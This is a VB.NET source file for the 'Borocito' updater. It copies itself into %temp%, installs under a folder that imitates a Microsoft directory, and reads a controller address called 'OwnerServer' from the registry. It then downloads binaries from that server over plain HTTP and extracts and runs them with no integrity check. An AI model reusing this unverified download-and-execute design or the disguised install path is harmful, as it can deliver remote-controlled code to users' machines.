Imports System.ComponentModel
Imports System.IO.Compression
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports Microsoft.Win32
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
    Public OwnerServer As String = Nothing
End Module
Module Utility
    Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Updater.log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\Updater.log", vbCrLf & Message, OverWrite)
            Catch
            End Try
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
        End Try
    End Sub

    <DllImport("kernel32")>
    Private Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
        'Use GetIniValue("KEY_HERE", "SubKEY_HERE", "filepath")
    End Function
    Public Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = Nothing) As String
        Dim sb As New StringBuilder(500)
        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
            Return sb.ToString
        Else
            Return defaultValue
        End If
    End Function
End Module
Module StartUp
    Sub Init()
        Try
            'Inicia desde otra ubicacion
            RunFromLocation()
            'Cargar direccion
            LoadSetting()
            'Buscar actualizaciones
            PreSearch()
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub RunFromLocation()
        Try
            If Application.StartupPath.Contains("Local\Temp") = False Then
                AddToLog("RunFromLocation@StartUp", "No se esta ejecutando desde %temp%, reejecutando...", False)
                If My.Computer.FileSystem.FileExists(DIRTemp & "\BoroUpdater.exe") Then
                    My.Computer.FileSystem.DeleteFile(DIRTemp & "\BoroUpdater.exe")
                End If
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRTemp & "\BoroUpdater.exe")
                Process.Start(DIRTemp & "\BoroUpdater.exe", parameters)
                End
            Else
                AddToLog("RunFromLocation@StartUp", "Se esta ejecutando desde %temp%", False)
                If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoUpdater.exe") Then
                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\BorocitoUpdater.exe")
                    My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\BorocitoUpdater.exe")
                End If
            End If
        Catch ex As Exception
            AddToLog("RunFromLocation@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub InitBorocito()
        Try
            AddToLog("InitBorocito@StartUp", "Iniciando Borocito...", False)
            Process.Start(DIRCommons & "\Borocito.exe")
            End
        Catch ex As Exception
            AddToLog("InitBorocito@StartUp", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
    Sub LoadSetting()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            OwnerServer = regKey.GetValue("OwnerServer")
        Catch ex As Exception
            AddToLog("LoadSetting@StartUp", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
End Module
Module Updater
    Public forceUpdate As Boolean = False
    Dim WithEvents UpdateDownloader As New Net.WebClient
    Dim UpdateDownloaderURI As Uri
    Dim BinaryZipFile As String = DIRTemp & "\Borocitos.zip"
    Dim ClientLocalFile As String = DIRCommons & "\Client.ini"
    Sub PreSearch()
        Try
            AddToLog("PreSearch@Updater", "Inicializando Updater...", False)
            If My.Computer.FileSystem.FileExists(ClientLocalFile) Then
                My.Computer.FileSystem.DeleteFile(ClientLocalFile)
            End If
            Dim ClientRemoteFile As String = "http://" & OwnerServer & "/Client.ini"
            My.Computer.Network.DownloadFile(ClientRemoteFile, ClientLocalFile)
            If forceUpdate Then
                AddToLog("PreSearch@Updater", "Forzando la descarga del binarios...", False)
                StartDownload()
            Else
                AddToLog("PreSearch@Updater", "Buscando actualizaciones...", False)
                CheckForUpdates()
            End If
        Catch ex As Exception
            AddToLog("PreSearch@Updater", "Error: " & ex.Message, True)
            'Iniciar Borocito
            InitBorocito()
        End Try
    End Sub
    Sub CheckForUpdates()
        Try
            Dim versionLocal = My.Application.Info.Version 'nope, debe ser la version de borocito, aunque igual es lo mismo pensando que Borocito no es Borocito.exe, si no que todo el paquete.
            Dim versionRemote = New Version(GetIniValue("Assembly", "Version", ClientLocalFile))
            Dim result = versionLocal.CompareTo(versionRemote)
            If (result < 0) Then 'Desactualizado
                AddToLog("CheckForUpdates@Updater", "Actualizacion encontrada, inicando proceso...", False)
                StartDownload()
            Else
                'Iniciar Borocito
                InitBorocito()
            End If
        Catch ex As Exception
            AddToLog("CheckForUpdates@Updater", "Error: " & ex.Message, True)
            'Iniciar Borocito
            InitBorocito()
        End Try
    End Sub
    Sub StartDownload()
        Try
            AddToLog("StartDownload@Updater", "Iniciando descarga de binarios...", False)
            UpdateDownloaderURI = New Uri(GetIniValue("Updates", "Binaries", ClientLocalFile))
            UpdateDownloader.DownloadFileAsync(UpdateDownloaderURI, BinaryZipFile)
        Catch ex As Exception
            AddToLog("StartDownload@Updater", "Error: " & ex.Message, True)
            'Iniciar Borocito
            InitBorocito()
        End Try
    End Sub
    Private Sub UpdateDownloader_DownloadFileCompleted(sender As Object, e As AsyncCompletedEventArgs) Handles UpdateDownloader.DownloadFileCompleted
        AddToLog("UpdateDownloader_DownloadFileCompleted@Updater", "Descarga completada", False)
        Unzip()
    End Sub
    Sub Unzip()
        Try
            AddToLog("Unzip@Updater", "Descomprimiendo...", False)
            StopIfRunning()
            If My.Computer.FileSystem.DirectoryExists(DIRCommons) Then
                My.Computer.FileSystem.DeleteDirectory(DIRCommons, FileIO.DeleteDirectoryOption.DeleteAllContents)
            End If
            My.Computer.FileSystem.CreateDirectory(DIRCommons)
            ZipFile.ExtractToDirectory(BinaryZipFile, DIRCommons)
            'Iniciar Borocito
            InitBorocito()
        Catch ex As Exception
            AddToLog("Unzip@Updater", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
    Sub StopIfRunning()
        Try
            Dim Borocito As Process() = Process.GetProcessesByName("Borocito")
            If Borocito.Length >= 1 Then
                Borocito(0).Kill()
            End If
            Dim Extractor As Process() = Process.GetProcessesByName("BoroExtractor")
            If Extractor.Length >= 1 Then
                Extractor(0).Kill()
            End If
        Catch ex As Exception
            AddToLog("StopIfRunning@Updater", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module